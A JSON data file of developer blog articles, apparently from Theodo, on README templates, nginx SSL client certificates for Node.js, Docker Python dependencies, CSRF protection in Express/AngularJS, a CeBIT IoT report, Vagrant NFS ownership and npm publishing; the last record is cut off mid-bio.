{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nA README template for better information storage\nAt Theodo, we are used to working on different kinds of projects. We work on\u00a0massive projects, with many developers and a long time of development\u00a0involved. We work on very complex projects, with specific technologies or\u00a0infrastructures, that we\u2019re not always familiar with. We also work on pretty\u00a0simple and straight-forward projects, but with a lot of existing code.\nThese situations lead us to some kind of \u201cinformation volatility hazard\u201d: there\u00a0is a risk that information gets lost from a developer to another, gets\u00a0forgotten between the beginning and the end of the project, or simply that you\u00a0don\u2019t manage to solve a problem in an easy way, just because you can\u2019t see the\u00a0problem has already been handled before.\nAfter working on various projects, I became sensitive to the way information\u00a0gets transmitted among the team, and (even more important) how it is described.\u00a0The worst thing that can happen in a project is when a developer takes some time\u00a0to write documentation, and the rest of the team can\u2019t find the crucial\u00a0information.\nAs a result, I began building a README template, that could help us structure\u00a0our knowledge on projects in a unified and accurate way, for any kind of\u00a0technology we are working on. The aim was to have a simple, yet exhaustive list\u00a0of what we need to know in our daily developer lives. We\u2019ve been using it for a\u00a0while on many projects. After some field testing and improvements, it\u2019s now time\u00a0to share it with the world! \nWhat does the README say? (Ring-ding-ding-reding\u2026)\nThere is a\u00a0dedicated GitHub repository\u00a0with this documentation template, that you can immediately clone in order to\u00a0start coding inside. It has been designed out of a Symfony2 project, so you might\u00a0notice some familiar Symfony commands used as examples, but this README template\u00a0is fully technology-agnostic, so you can use it whether you are working in\u00a0Javascript, Ruby, PHP or any other swaggy language.\n\nAs I told you before, the \u201cfrontpage\u201d (I mean the README.md) of this\u00a0documentation contains only the name of the description of the repository, plus\u00a0a list of sections\u2026 Oh, and we also included the name of the people who\u00a0contributed to the project. And this is actually a really important part you\u00a0should not forget! Believe it or not, human beings are the best source of\u00a0information (true story). That\u2019s why you should always keep in mind (and in your\u00a0README) who worked on each project, in case you need a hand to solve a tenacious\u00a0bug. Regarding Theodo projects, we split the team according to the role of each\u00a0person, so we added our Scrum Master and our sales person for each project.\nThe main sections of your documentation\nThen, let\u2019s talk about the different divisions in our documentation. Each time\u00a0I struggled on a project, I tried to understand what was blocking me; I ended up\u00a0categorizing the problems into six sections:\n\nInstallation: This is where you explain how to install your project. The\u00a0shorter, the better: a good project requires only a few commands to be installed\u00a0and any sophisticated operations should be bypassed automatically. You may add a\u00a0\u201cTroubleshooting\u201d part in this section if you think it would be useful.\nData model: An important, but most of the time neglected section.\u00a0Help your new teammates understand what is the application they are about to\u00a0work on, by describing the data model, potentially the database schema involved.\u00a0Feel free to describe the real meaning of the objects and classes of the project,\u00a0as the most technical projects handle real-world items.\nDatabase: This section is intended for explaining how to get fresh data,\u00a0in case your project is data-oriented. Whether you use fixtures, database dumps\u00a0or SQL batches, describe here how your developers can fill in their local\u00a0environments with fresh data.\nProvisioning: Describe here how to update your servers with additional\u00a0packages. Feel free to explain as well how to correctly manipulate provisioning\u00a0files, if there are some subtleties in the way your provisioning works.\nGit Worklow: Pretty straight-forward title. Explain which branch should\u00a0be rebased and where you should merge your feature before deploying.\nEnvironments: A crucial part as well, you should first give the list of\u00a0your different environments, with additional information such as the URL, the\u00a0related Git branch, etc. Finally, explain how to deploy on each environment.\n\nObviously, this structure is completely flexible: feel free to add any relevant\u00a0section (or remove any irrelevant one), based on your project, its technologies,\u00a0and more important: its team!\nConclusion\nI hope this README template will help you organize and clarify information in\u00a0all your projects! Please contribute to the\u00a0README template repository through\u00a0pull requests or issues.\nAnd remember: a good documentation should stay simple and go straight to the\u00a0point. Don\u2019t flood your README with thousand of sections, or your coworkers\u00a0won\u2019t read any of them! As Saint-Exup\u00e9ry said:\nPerfection is achieved, not when\u00a0there is nothing more to add, but when there is nothing left to take away.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tKenny Durand\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThe problem we had\nWe had to secure some routes of our Node.js API so only trusted servers could call them.\nThere are others solutions to do so, but for this project we had to do it using SSL client certificates.\nWe followed the really nice tutorial from Nate Good that explained how to do it with nginx and FastCGI.\nI decided to do a similar tutorial for nginx and Node.js.\nThe following will help you build the same thing in your development environment.\nIf you don\u2019t really know how nginx works, have a look at my blog post about the basics of nginx.\nThe certificates\nFirst you need to create a CA key. What\u2019s a CA? Let\u2019s ask wikipedia:\nIn cryptography, a certificate authority or certification authority (CA) is an entity that issues digital certificates.\nThis key will be used to sign client or server certificates. Signing a certificate is a way to say \u201cI trust\u201d this client or server.\n# Create the CA Key and Certificate for signing Client Certs\r\nopenssl genrsa -des3 -out ca.key 4096\r\nopenssl req -new -x509 -days 365 -key ca.key -out ca.crt\r\n\nThen you can create your server and client certificate.\n# Create the Server Key, CSR, and Certificate\r\nopenssl genrsa -des3 -out server.key 1024\r\nopenssl req -new -key server.key -out server.csr\r\n\r\n# Create the Client Key and CSR\r\nopenssl genrsa -des3 -out client.key 1024\r\nopenssl req -new -key client.key -out client.csr\r\n\nFinally, you can sign your certificates with the CA you just made.\n# We're self signing our own server cert here.  This is a no-no in production.\r\nopenssl x509 -req -days 365 -in server.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out server.crt\r\n\r\n# Sign the client certificate with our CA cert.  Unlike signing our own server cert, this is what we want to do.\r\nopenssl x509 -req -days 365 -in client.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out client.crt\r\n\nWhen you create your Certificate Signing Request (CSR), your web server application will prompt you for information about your organization\nand your web server.\nThis information is used to create the certificate\u2019s Distinguished Name (DN) allowing you to know which client is doing the request.\nIn our case, the client is a server we trust.\nThe nginx configuration\nHere is a working nginx conf\nserver {\r\n        listen 8443;\r\n        ssl on;\r\n        server_name node-protected-app;\r\n        #Classic part of ssl\r\n        ssl_certificate      /var/www/server.crt;\r\n        ssl_certificate_key  /var/www/server.key;\r\n\r\n        #Here we say that we trust clients that have signed their certificate with the CA certificate.\r\n        ssl_client_certificate /var/www/ca.crt;\r\n        #We can choose here if we allow only authenticated requests or not. In our case it's optional\r\n        ssl_verify_client optional;\r\n\r\n        location / {\r\n\r\n                proxy_set_header X-Real-IP $remote_addr;\r\n                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\r\n\r\n                #If the client certificate was verified against our CA the header VERIFIED\r\n                #will have the value of 'SUCCESS' and 'NONE' otherwise\r\n                proxy_set_header VERIFIED $ssl_client_verify;\r\n                #If you want to get the DN information in your headers\r\n                proxy_set_header DN $ssl_client_s_dn;\r\n\r\n                proxy_pass http://127.0.0.1:3000;\r\n        }\r\n}\r\n\nUsing restify\nFinaly here is a short implementation using restify in CoffeeScript:\nrestify = require 'restify'\r\n\r\nexerciseApi = restify.createServer(\r\n  name: 'nginx-exercise'\r\n)\r\n\r\n# API Routes\r\nexerciseApi.get '/', (req, res) ->\r\n  res.send 'Hello from the api'\r\n\r\n# API Routes\r\nexerciseApi.get '/protected-route', (req, res) ->\r\n  console.log req.headers\r\n  return res.send(401) if req.headers.verified isnt 'SUCCESS'\r\n  res.send 'This is a serious content'\r\n\r\nexerciseApi.startServer = (port = 3000, callback) ->\r\n  console.log \"Starting server on port \"+port\r\n  exerciseApi.listen port, callback\r\n\r\nexerciseApi.startServer()\r\n\nIt\u2019s very simple, we just have to check the header to allow or not the request.\nI have updated my nginx sandbox, if you want to try all of this\nin a clean environment.\nIf you do so, inside the Vagrant you can test with cURl that your API is behaving as expected:\ncurl -k --key client.key --cert client.crt https://localhost:8443/protected-route\r\n\nUsing loopback\nLet\u2019s imagine you have a model with a dogs entity.\nIf you want to allow some specific actions to be done only by a trusted client, you can do the following:\n//common/models/dogs.js\r\nmodule.exports = function(Dogs) {\r\n  Dogs.beforeRemote('upsert', function(ctx, instance, callback) {\r\n    console.log(\"headers\", ctx.req.headers);\r\n    console.log(\"verified\", ctx.req.headers.verified);\r\n    //Here you can test the headers\r\n  });\r\n};\r\n\nLet\u2019s say that you have the following dog.json fixture file like:\n{\r\n  \"name\": \"Pluto\",\r\n  \"owner\": \"Mickey\"\r\n}\r\n\nYou can simulate an upsert with:\ncurl -X PUT -F \"metadata=<dog.json;type=application/json\" https://127.0.0.1:8443/api/dogs --key client.key --cert client.crt -k\r\n\nSSL inside Node.js\nNode can run a web server. It\u2019s also possible to use SSL and SSL client authentication directly with Node.js.\nThere is another blog post from Nate Good about it.\nAn issue you could encounter with cURL\nOn our project, we had some problems using curl with the certificates. We ended up making our tests with httpie which is also a nice tool.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIf you\u2019ve ever developed a python application, you\u2019ve probably installed your python dependencies in a virtualenv. A simple way to do so is:\n# build a virtualenv\r\nvirtualenv venv\r\n\r\n# activate the virtualenv\r\nsource venv/bin/activate\r\n\r\n# install some dependencies\r\npip install flask\r\n\nThanks to virtualenv your project dependencies are now isolated from your other projects and from the operating system packages. Simple, isn\u2019t it?\nAnother way to locally isolate you project is to install your dependencies in a docker container (actually the best practice would be to use virtualenv in a docker container as described here: https://hynek.me/articles/virtualenv-lives).\nIn this use-case, you\u2019ll want to store the python packages required by your application in a mounted folder to avoid re-installing them everytime you reset your container in development. In other words, you\u2019ll want to store the python dependencies in a specific folder.\nThe first obvious solution to that is using the -t, --target <dir> Install packages into <dir>. pip option.\nHowever this option ends up being a trap. When using the --target option the installer changes its behaviour in a non desirable way for us, and becomes incompatible with the --upgrade option as described here: https://github.com/pypa/pip/issues/1489.\nA better solution, in line with PEP 370, is to use the PYTHONUSERBASE environment variable. Cf. https://www.python.org/dev/peps/pep-0370/.\nYou just need to then use pip install --user and your packages will be installed in a specific folder without any of the strange side-effects of the --target option.\nHere is the detailed step-by-step solution.\nYour docker-compose file should look like this:\n# docker-compose.yml\r\nvendors:\r\n  image: python:3\r\n  working_dir: /mnt\r\n  volumes:\r\n    - .:/mnt\r\n  environment:\r\n    PYTHONUSERBASE: /mnt/vendor\r\n  command: pip install -r requirements.txt --user --upgrade\r\n\r\nserver:\r\n  image: python:3\r\n  working_dir: /mnt\r\n  volumes:\r\n    - .:/mnt\r\n  ports:\r\n    - '5000:5000'\r\n  environment:\r\n    PYTHONPATH: src\r\n    PYTHONUSERBASE: /mnt/vendor\r\n  command: python src/server.py\r\n\r\n\nInstall your vendors (do it twice just to check!):\ndocker-compose run --rm vendors\nRun your app:\ndocker-compose up -d server\nConclusion\nThe PYTHONUSERBASE is used to compute the path of the user site-packages directory. You should use it in pair with the pip --user option to install python packages in a custom directory.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Girault\r\n  \t\t\t\r\n  \t\t\t\tNicolas is a web developer eager to create value for trustworthy businesses.\r\nSurrounded by agile gurus at Theodo, he builds simple solutions along with tech-passionates.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tCSRF vulnerabilities are one of the most common and important flaws in Web applications security. It is listed as the eighth most critical vulnerability in the OWASP Top 10. Symfony2, which we often work with at Theodo, offers cool automatic tools (especially for forms) to protect your applications against such flaws. But when it comes to our applications using Angular and Express, there are things that need to be done.\nWhat are CSRF attacks?\nCSRF is the acronym for Cross Site Request Forgery. Those attacks consist in making users of an application send a request the attacker has previously forged.\nLet\u2019s say that, in a vulnerable application, some users are able to delete accounts. This action requires specific rights in the application, such as being an admin. The attacker may generate a script whose goal is to send the request \u201cdelete the user whose id equals 42\u201d to our application\u2019s server. If the request uses a GET HTTP method, a simple hyperlink might suffice! He will then make an admin of our application send this request by making him go on a website that executes the script. The admin user has either a session or cookies stored in his browser specifying he has the admin role. And thus, when he sends the request, he indeed deletes the account of the user of id 42!\nThe request does not come from our application, but from another website, thus the Cross Site Request Forgery name. The idea is to prove to our server that the request does not come from foreign websites. We will use a randomly generated token by the server, that will have to be included in the request.\nHow to prevent it with Express and AngularJS?\nIt is actually pretty simple, there aren\u2019t as many things to do as there used to be. You\u2019ll have to install a middleware, and tell Express how to use it. Finally you\u2019ll have to tell Express which name the cookie must be given for Angular to recognize it.\nThe middleware I used is called csurf. It used to be native in Express 3.x, but it is not the case anymore since it moved on to 4.x (almost one year ago). Nevertheless, it is still pretty easy to install. Add the line\n\"dependencies\": {\r\n    ...\r\n    \"csurf\": \"^1.7.0\"\r\n},\r\n\nto your dependencies in your package.json file and then make npm install. You might also directly make \u2018npm install \u2013save csurf@1.7.0\u2019\nThen, in your main express file, you have to add a few lines to configure the csurf middleware.\ncsrf = require('csurf');\r\n\r\n...\r\n\r\napp.use(cookieParser('secretPassword'));\r\napp.use(csrf());\r\napp.use(function(req, res, next) {\r\n  res.cookie('XSRF-TOKEN', req.csrfToken());\r\n  return next();\r\n});\r\n\nWhat are these lines for? You tell Express to use csurf that you just required. This must be done after cookie and/or session initialization in order for the middleware to be correctly configured.\nThen, you will tell Express that it must write the csrf cookie in the response in the \u2018XSRF-TOKEN\u2019 field. This is it. Your app is protected against CSRF attacks. Now, whenever your AngularJs application will send a POST request, it will add a header inside, whose name will be X-XSRF-COOKIE. And the csurf middleware will automatically look for this header and compare it with the value it expects. Csurf expects the token in a header named csrf-token, xcsrf-token, x-csrf-token, or x-csrf-token. Thus, no need to change anything, it\u2019s automatic!\nIt is important to note that only your POST requests will include this header, therefore your GET requests are not protected. Csurf could also find the token when it is in one ot the two following locations : req.body._csrf or req.query._csrf. This means that if you really want to protect a GET request that you don\u2019t want to use POST method for, you may add the value of the token within the field \u2018_csrf\u2019 in your query string.\nHow to be sure it works?\nI used the Postman REST Client plugin for Google Chrome. This will help us simulate an attack on the application.\nI choose the POST method (as I said, only POST requests are automatically protected), I enter the request URL in the corresponding field (for instance: myapplication.com/user/delete. I then fill in the key/value paired fields with correct pairs, for instance userId as a key, and 42 as the associated value.\nI then click on the Send button, and boom! I get a response with a 403 status.\n\nThat\u2019s good! Let\u2019s test if the request works when the headers are correctly set now. To do this, I go on the page of my application in which I can really delete the user. I check my cookies (in Google Chrome, press F12, click on Resources and then on Cookies), and I copy the value contained in the cookie named x-xsrf-cookie. In Postman, I click on the Headers (0) button, and I paste the value in the \u2018Value\u2019 input. Then, in the \u2018Header\u2019 input, I type X-XSRF-COOKIE. I click on Send once again. And, this time it works! The application sent back a correct response with good informations concerning the deleted user, and with a 200 status.\n\nYour app is now more secure, congratulations!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tPaul Molin\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tOn Monday, March 16, I got the chance to attend the first day of CeBIT 2015 in Hannover, Germany, the biggest Computer science related fair of the world (Wikipedia says) and more specifically the Code_n building which theme was \u201cInto the internet of Things\u201d. Code_n is defined as an \u201cinitiative [that] offers an ecosystem designed to network digital pioneers and support the development of new, digital business models.\u201d according to their website. In other words, it is one of the many helpers for startups to grow, get known and get to know other actors in their space or related spaces. In this objective, it comes every year at CeBIT and offers a space for startups to present their work and network.\nIt is actually hard to say \u201cI attended CeBIT\u201d because you can\u2019t humanly attend each and every thing at CeBIT, which happens over an area of 450 000 square meters and over 20 buildings. From Enterprise level IT groups to chinese smartphone waterproof accessories manufacturers, smart dartboards startups and drones companies, you can see anything at CeBIT.\n \n\nThis article is therefore an extract of what I saw in the Code_n building and its core theme that make a lot of people right on the internet today : The Internet Of Things.\nAn IoT welcome \u2013 Robochop\nThe thing\n\nWhen entering the Code_n building, the first (and almost only) thing you could see was Robochop.\nAn installation of 3 industrial robots cutting polystyrene cubes automatically.\nThe particularity of these cuts is that the designs of all of them have been created by people around the world in a web interface, and will be sent to their creators just after CeBIT.\nSee website: http://www.robochop.com/\nThe story\nClemens Weisshaar is a designer trying to make the line between digital and physical world vanish.\nHe already had some projects in his past relating to this theme:\n* A \u201cMagic mirror\u201d for retail (in the PRADA Epicenter in Beverly hills) : A camera films you and when you turn, it slows down the time so that you can see your back and how the clothes fit you.\n* Breeding tables \u2013 centre Pompidou: A concept of tables, each unique because randomly generated but mechanichally strong enough for being a table and manufactered only by cutting and bending steel.\n* OutRace : A robotic installation doing light painting of tweets sent by people on Trafalgar square in London.\n* RT18 chair prototype : The designer (with the help of Reed Kram as well) created a chair full of sensors to see constraints, visualizable in real-time on a screen facing the chair and allowed people to sit and play with it. With the data they retrieved during this experiment, they were then able to create the lightest chair ever (2.2kg).\nWith his latest projects, Clemens Weisshaar wanted to assemble Design, Engineering, Giving code to the machine and Shipping all in one application, as in a production line. And when possible give the power to users in the process.\nClemens Weisshaar and Reed Kram connect people to heavy machinery and Robochop is their latest piece of Art and Technology.\nThe big trends I felt\nBeing THE platform\n\u201cOne platform to rule them all, One platform to find them,\nOne platform to bring them all and in the darkness bind them\u201d\n\nA lot of startups out there are interested in binding all your smart objects together for different purposes:\n\nCozify, for example, is a Finnish startup that creates a mobile app to allow you to group, control and manage your smart devices at home in a simple way.\nWicross is a French company that wants to bring together all the Data of your smart devices, and create a platform to \u201csell\u201d/exchange this data to/with big companies to get better services or additional value out of your devices.\nReelyActive is not only in this scope but partly wants to be the open-source platform on which you can host your identity linked to one or several of your smart devices (for example, your smartwatch becomes your ID card in the virtual world (but I\u2019ll explain reelyActive\u2019s activity in more details a bit further in this article)\nHomey One of my favourites, is a small ball-ish device (very similar to the Nexus Q in design and, I asked them, they totally stole the idea) that you will surely place in your living room and whom you can talk to to control your devices. Some of the examples were \u201cHomey, can you turn the lights to green please? (not mandatory)\u201d > Homey connects to the Philips Hue light bulbs and turns them green.\nMuzzley One app to control, connect to all your devices and display their updates\nPipesBox Pretty similar\nMany more in a more B2B manner: Carriots, Com2m, Sensefinity, M2MGO \u2026\n\nSecurity/Security without keys\n\nWe knew it already with the success of MyFox at CES, but security is a big concern for customers, and many entrepreneurs see in this area a big opportunity.\n\nKiwi.Ki creates a system that allows you to enter your building thanks to a transponder that you can keep in your pocket or thanks to your smartphone.\nFUZ design (changing name soon) does different types of Locks for your bike, your fence or your container that you can open with Bluetooth and you can manage the access to (You can lend your bike to a friend for example)\nEvercam : Apps for cameras over Ip\nLEAPIN Digital Keys manufacters door locks that you can open with your phone (targetting the hostel\u2019s card lock mostly)\nNovi The 2.0 version of your house alarm/smoke detector\n\nIndoor navigation/location\n\nConTagt\nLoopd (more or less) creates small beacons for events/museums to gather analytics about visitors.\nXetal Indoor localization without beacons\n\nParking\n\nI would never have thought that, as a not-so-much car driver, but Parking seems to really be a big problem in our everyday lives.\nProof ?\nAt least 3 startups of the 50 finalists chosen by Code_n try to tackle this problem (and you can find more online or in this article).\n\nComThings does a Cloud connected Universal Remote to open all your doors and garages\nParkPocket is working on a mobile phone app to find and rent a Parking spot easily\nParkTag Automatically predicts which park spaces will be free soon\n\nMore in depth with a startup (my favourite) : ReelyActive\n\nReelyActive is a Montreal company founded in 2012. After getting some interest by participating to the Founder Fuel Fall 2012 session, ReelyActive published three scientific papers to support the science behind their vision and their product and has been title \u201cWorld\u2019s best startup\u201d in November 2013.\nTheir main hardware product is a set of sensors called \u201creelceivers\u201d available for Bluetooth or RFID detection that connect to the network through RJ45 ports and enter in communication with a hub that needs to be on the network.\n\nThe idea is then to bridge your physical world to the virtual world and the potential of this technology is awesome. From the smart home to the smart museum, the smart office or the smart parking, ReelyActive is just making it able to turn any space in a smart space.\nThe whole software side is then open-source and based on NodeJS technology. Documentation and tutorials are available on github, along with all the code allowing you to super easily plug your sensor and start decoding bluetooth communication and even visualising them easily in a smartspace !\n\nConferences\nWith just one day to attend, I didn\u2019t see a lot of conferences (sadly did\u2019nt have the chance to see Edward Snowden live conference) but I still manage to see two of them (without considering a Pitch & Question session), that I will summarize in bullet points hereafter \u2013 to be honest, because it was a bit disappointing.\nInto the internet of the customers (Salesforce):\n\nWhat\u2019s important in your app, service, [fill the blank], \u2026 ? The Customer\nSalesforce: #1 CRM for Marketing, analysis, communication with partners, most innovative company according to Forbes\nAt Salesforce, 1% of the time of everyone, the equity of the company and the money won by the product are given to social\nHow Robochop works with salesforce : data retrieved from the robots : problems, performance, production rate, where the \u201ccommands\u201d come from, etc. (pretty cool actually)\n\nOpportunities for a digital Germany (Google):\n\nInternet is for everyone.\nMore devices every day : wear, car, smart phones\nEvery business can compete with big groups now\nEvery business is a digital business as well (or should be)\nHowever, founding a company is hard in Europe (harder than in the US?) => Google helps (the factory (Berlin), Google ventures Europe,\u2026)\n\nIn conclusion, this day has been a really busy day at CeBIT and the Internet of Things seems to have always more new actors and for me, the small startups are definitely eating more and more of the pie of innovation and new markets compared to the giants (Google\u2019s booth and conference were really disappointing).\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAdrien Thiery\r\n  \t\t\t\r\n  \t\t\t\tAdrien Thiery is an agile Web Developer at Theodo and likes Design, Technology and the Internet of Things. You can learn more about him on http://www.thiery.io/  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nIf you ever tried to sync folder between a host machine and a guest one with vagrant over nfs, you may have noticed that everything is ok until you need your shared folder to be owned by a non root user.\nSyncing over NFS as non root\nI read this good article which describes the solution: share the same UID:GID between your host and your guest.\nTo provision my base box I use Ansible. The plan is to create a user on the guest with Ansible. This user will have the same uid and guid than the user who runs the vagrant up but with custom username and group name.\nAnsible provides a lookup function that allows you to run shell command on your host and bring the result into your guest. That\u2019s how I used it.\nmyproject/playbook.yml\n\r\n---\r\n- hosts: stage\r\nsudo: yes\r\ngather_facts: true\r\nroles:\r\n- { role: user }\r\n\nmyproject/hosts/stage\n\r\napp_user=georges\r\napp_group=georges\r\nhome_path=/home/georges\r\n\nmyproject/roles/user/tasks/main.yml\n\r\n---\r\n- name: Create specific app group\r\ngroup: gid={{ lookup('pipe', 'id -g') }} name={{ app_group }} state=present\r\n\r\n- name: Create specific app user\r\nuser: uid={{ lookup('pipe', 'id -u') }} name={{ app_user }} group={{ app_group }} state=present home={{ home_path }}\r\n\nmyproject/Vagrantfile\n\r\n[...]\r\nconfig.vm.synced_folder \"../host_shared\", \"/home/georges/guest_shared\", type: \"nfs\", create: true\r\nconfig.vm.provision :ansible do |ansible|\r\nansible.inventory_path = \"hosts/stage\"\r\nansible.sudo = true\r\nansible.playbook = \"playbook.yml\"\r\nend\r\n[...]\r\n\nRun vagrant up and here you go! Your folders will now be owned by user georges in your guest machine.\nPitfalls\nHere are four pitfalls in witch I throw myself in.\n\n1. The simplest solution would be to use the UID environment variable, but for some reason UID seems not to be available whith lookup. An alternate solution would be using a temp variable export USER_ID=$UID, and then {{ lookup('env', 'USER_ID') }}. It will work, but requires modifying your host environment specifically for this fix, which I did not want to do.\n\n\n2. My research leads me to use rsync rather than NFS. Indeed, rsync allows you to choose a custom owner for your shared folder:\nconfig.vm.synced_folder \"../host_shared\", \"/home/georges/guest_shared\", type: \"rsync\", user: \"georges\", group: \"georges\", create: true\n. The user an group options will not work with NFS. Again, this is not a good solution: rsync took more than 4 seconds in most of the cases to sync the files of my project.\n\n\n3. Beware that you may have conflicts with host\u2019s UIDs and guest\u2019s ones. For me it went like clockwork since my host was an Ubuntu, meaning that custom user\u2019s UID starts at 1000, and my guest box was a CentOs with no UID upper than 500.\n\n\n4. You may encouter the following problem: the first sync may result in guest synced folder owned by root. This is because the user with your UID is not created at first vagrant up. See [this thread](https://github.com/mitchellh/vagrant/issues/936) for more information. I solved it by adding a file action in my ansible playbook to change the ownership of this folder: file: path=/home/georges/guest_shared state=directory mode=755 owner={{ app_user }} group={{ app_group }}. This is not clean but it works.\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tRapha\u00ebl Dubigny\r\n  \t\t\t\r\n  \t\t\t\tRapha\u00ebl is an agile web developer at Theodo. He uses angular, nodejs and ansible every day.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\n  \n    \n  \n\nI just made an npm package: gulp-backpack and it was pretty easy to publish it to npm!\nTherefore I wanted to share what you need to know so you can do it too.\nCreate your package\nObviously before publishing anything you\u2019ll need to code it!\nPackage.json\nThe core of your node package is the package.json file.\nIf there is one file you should care about, it\u2019s this one.\nThere is a nice documentation about what you must and what you can do with this file.\nHere are the most important aspects of the package.json file:\nThe name and the version of your package are required to allow people to install the package\nAdd the dependencies needed for your package.\nAdd some entries so npm users will have a better understanding of your package like description, license, author, homepage, keywords, repository\nScripts section should contain the tests of your application because anyone should be able to run them with a npm test.\nRequire your module\nWhen you want to use your module in a js program, you require it. You do something like\ngbp = require 'gulp-backpack'\r\ngbp.gulp.task 'clean', ->\r\n  gbp.del.sync 'www'\r\n\nYou may wonder which file will be called when you require the module. The rule is simple:\nIt will run the *index.js* in the root directory of your module\r\nUnless you specify a *main* entry in your package.json\r\n\nBy the way, have you ever asked yourself wtf is going on when you require a module ?\nWrite or at least build your module in JS\nYou may code in CoffeeScript but don\u2019t forget that it\u2019s not everyone\u2019s case. As you go open source, you want to target as many people as you can !\nTest your module\n \nWhen you are coding for open source, you can use a lot of nice tools for free.\nFor testing purposes, you can use Travis to run your tests and Coveralls for your code coverage.\nAdd a .travis.yml file to tell travis what it has to do.\nIf you don\u2019t know how to configure Travis have a look at Reynald\u2019s tutorial.\nFor a node package it\u2019s pretty simple because travis will automatically run npm install and npm test.\nYou can easily tell travis with which version of node you want the tests to be run:\nnode_js:\r\n  - \"0.10\"\r\n  - \"0.12\"\r\n  - \"iojs\"\r\nafter_script:\r\n  - npm run coveralls\r\n\nBuilding a CLI tool\nIf you are willing to create a CLI tool. I advise you to use Liftoff, it will help you a lot!\nPublishing\nAs the official documentation is not so explicit, I had to search a little bit.\nI finally found this excellent Gist written by AJ ONeal.\nThanks to him I was able to follow theses simple steps to publish my package.\nCreate an npm user\nYou need to create a user on the npm\u2019s platform. Use the npm command for that, no need to sign up on the website.\nFirst you have to configure your author informations so that npm can create your account.\nnpm set init.author.name \"Your Name\"\r\nnpm set init.author.email \"you@example.com\"\r\nnpm set init.author.url \"http://yourblog.com\"\r\n\nThen you are good to create your user. Use the npm command line as well.\nnpm adduser\r\n\nIt will ask your three questions\u2026\nThe username you want to use for your npm's account\r\nThe password of your npm's account.\r\nThe email you will use for your npm's account. It will be publicly shown on the npm's website\r\n\n\u2026and it\u2019s done! Don\u2019t worry if there is no confirmation message.\nJust go to https://www.npmjs.com/~ to check that your account has been created.\nPublish\nThis part is for very skilled developers because you have to run:\nnpm publish\r\n\nand you are done. You can search your package: it should already be available.\ngulp-backpack\n\n  \n    \n  \n\nA little more about gulp-backpack. As I said in the README:\nThis repository is meant to simplifies the inclusion of all those tools and gulp plugins we all need to compile our angular apps with using gulp. One gulp-backpack to gulp them all!\nI will enjoy any feedback about it!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and 